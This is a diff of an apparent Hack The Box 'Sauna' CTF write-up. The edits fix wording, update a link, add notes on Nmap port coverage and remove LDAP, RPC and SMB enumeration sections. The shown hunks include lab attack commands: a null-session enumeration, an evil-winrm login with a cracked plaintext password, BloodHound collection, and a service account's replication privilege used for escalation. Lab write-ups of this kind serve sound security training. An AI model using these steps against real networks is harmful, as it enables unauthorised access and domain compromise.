@@ -16,7 +16,7 @@ tags:
 
 The [Sauna](https://app.hackthebox.com/machines/Sauna) machine has been created by [egotisticalSW](https://app.hackthebox.com/users/94858). This is an **easy** Windows Machine with a strong focus on Active Directory enumeration and exploitation. To get through this machine, a bit of reconnaissance skills should be enough.
 
-If you didn't solve this challenge and just look for answers, first you should take a look at this [mind map](https://github.com/Orange-Cyberdefense/arsenal/blob/master/mindmap/pentest_ad_dark.png?raw=true) from [Orange Cyberdefense](https://github.com/Orange-Cyberdefense) and try again. It could give you some hints for attack paths when dealing with an Active Directory.
+If you didn't solve this challenge and just look for answers, first you should take a look at this [mind map](https://github.com/Orange-Cyberdefense/ocd-mindmaps/blob/main/img/pentest_ad_dark_2023_02.svg) from [Orange Cyberdefense](https://github.com/Orange-Cyberdefense) and try again. It could give you some hints for attack paths when dealing with an Active Directory.
 
 ![image-center](/images/htb/htb_sauna_infocard.png){: .align-center}
 
@@ -32,6 +32,9 @@ This information can then be leveraged by an adversary to aid in other phases of
 ## Scan with Nmap
 
 Let's start with a classic service scan with [Nmap](https://nmap.org/). Note the **-sV** switch which enables *version detection* and allows Nmap to check its internal database to try to determine the service protocol, application name and version number.
+
+**Note:** Always allow a few minutes after the start of an HTB box to make sure that all the services are properly running. If you scan the machine right away, you may miss some ports that should be open.
+{: .notice--info}
 
 ```bash
 $ nmap -Pn -sV 10.129.95.180
@@ -58,68 +61,14 @@ Service detection performed. Please report any incorrect results at https://nmap
 Nmap done: 1 IP address (1 host up) scanned in 50.03 seconds
 ```
 
-**Remember:** By default, **Nmap** only target the 1000 most common ports. You can find the full list here: [https://github.com/nmap/nmap/blob/master/nmap-services](https://github.com/nmap/nmap/blob/master/nmap-services). However, they are sorted by port numbers, not by open frequency.
+**Remember:** By default, **Nmap** will scans the 1000 most common TCP ports on the targeted host(s). Make sure to read the [documentation](https://nmap.org/docs.html) if you need to scan more ports or change default behaviors.
 {: .notice--warning}
 
-As we can see, the output reveals an LDAP (TCP/389) port with the **egotistical-bank.local** domain name and an HTTP (TCP/80) port.
-
-## LDAP
-
-To continue the reconnaissance phase, let's try an anonymous bind on the LDAP port using [ldapsearch](https://linux.die.net/man/1/ldapsearch) and see if we can get some information.
-
-```bash
-$ ldapsearch -x -b "dc=egotistical-bank,dc=local" -H ldap://10.129.95.180
-# extended LDIF
-#
-# LDAPv3
-# base <dc=egotistical-bank,dc=local> with scope subtree
-# filter: (objectclass=*)
-# requesting: ALL
-#
-
-# EGOTISTICAL-BANK.LOCAL
-dn: DC=EGOTISTICAL-BANK,DC=LOCAL
-objectClass: top
-objectClass: domain
-objectClass: domainDNS
-distinguishedName: DC=EGOTISTICAL-BANK,DC=LOCAL
-
-...[snip]...
-
-```
-
-No interesting information here, let's move on.
-
-## RPCClient
-
-The **MSRPC** (TPC/135) port is open. According to this [Pentesting Cheatsheet](https://www.ired.team/offensive-security-experiments/offensive-security-cheetsheets#rpc-netbios-smb), we could try to establish a *null* session using the *rpcclient* tool to enumerate some users.
-
-As per the name, a null session does not require any username or password to get information about the remote host. So, let's prepare the **rpcclient** command with no username (`-U ""`), no password (`-N`) and a command to run in order to enumerate domain users (`-c enumdomusers`).
-
-```bash
-$ rpcclient -U "" -N -c enumdomusers 10.129.95.180                     
-result was NT_STATUS_ACCESS_DENIED
-```
-
-Still no results.
-
-## SMB
-
-Maybe we can try to find open shares via an anonymous login on the target machine with [smbclient](https://www.samba.org/samba/docs/current/man-html/smbclient.1.html). Note that the **-N** switch suppresses the normal password prompt.
-
-```bash
-$ smbclient -N -L \\\\10.129.95.180
-Anonymous login successful
-
-        Sharename       Type      Comment
-        ---------       ----      ------
-```
-
-Again, no results.
+As we can see, the output reveals an **LDAP** (TCP/389) port with the **egotistical-bank.local** domain name and an **HTTP** (TCP/80) port.
 
 ## HTTP
 
-Let's go to the HTTP port to see if there is something to be found. Compagnies website are often a good place to find employee names that can be used during targeting. Employee names are used to derive email addresses as well as to help guide other reconnaissance. 
+Let's go to the HTTP port to see if there is something to be found. Companies websites are often a good place to find employee names that can be used during targeting. Employee names are used to derive email addresses as well as to help guide other reconnaissance. 
 
 ![image-center](/images/htb/htb_sauna_website.png){: .align-center}
 
@@ -212,11 +161,13 @@ HTTP        10.129.95.180   5985   10.129.95.180    [*] http://10.129.95.180:598
 WINRM       10.129.95.180   5985   10.129.95.180    [+] egotistical-bank.local\fsmith:Thestrokes23 (Pwn3d!)
 ```
 
+**Note:** The WinRM ports (5985/TCP and 5986/TCP) didn't show up while scanning the machine, but they are actually open. Again, this is due to the fact that, by default, Nmap only scans the 1000 most common TCP ports and WinRM ports are probably not part of them.
+{: .notice--info}
+
 The password is valid and we do have a WinRM access to the remote computer. Using [Evil-WinRM](https://github.com/Hackplayers/evil-winrm) and the recovered account, we can try to connect to the remote machine.
 
 ```bash
 $ evil-winrm -i 10.129.95.180 -u fsmith -p Thestrokes23 
-
 Evil-WinRM shell v3.3
 Info: Establishing connection to remote endpoint
 
@@ -259,7 +210,7 @@ INFO: Done in 00M 03S
 INFO: Compressing output into 20220204181855_bloodhound.zip
 ```
 
-Now, you can import the generated file (*20220204181855_bloodhound.zip*) in BloodHound by running `sudo neo4j console`, then execute BloodHound in another terminal with the `bloodhound` command.
+Now, you can import the generated file (*20220204181855_bloodhound.zip*) in BloodHound by running `sudo neo4j start`, then execute BloodHound in another terminal with the `bloodhound` command.
 
 ## Getting Administrator Privileges
 
@@ -311,7 +262,7 @@ SMB         10.129.95.180  445    SAUNA            [*] Windows 10.0 Build 17763 
 SMB         10.129.95.180  445    SAUNA            [+] egotistical-bank.local\svc_loanmgr:Moneymakestheworldgoround! 
 ```
 
-The credentials are valid. Back to BloodHound, we can see that **svc_loanmgr** account have the *GetChangesAll* privilege on the target domain.
+The credentials are valid. Back to BloodHound, we can see that **svc_loanmgr** account has the *GetChangesAll* privilege on the target domain.
 
 ![image-center](/images/htb/htb_sauna_bloodhound_01.png){: .align-center}
 
@@ -357,4 +308,4 @@ SMB         10.129.95.180   445    SAUNA            1 File(s)             34 byt
 SMB         10.129.95.180   445    SAUNA            2 Dir(s)   7,754,547,200 bytes free
 ```
 
-Awesome ! I hope you enjoyed it, I know I did :)
+Awesome! I hope you enjoyed it, I know I did :)
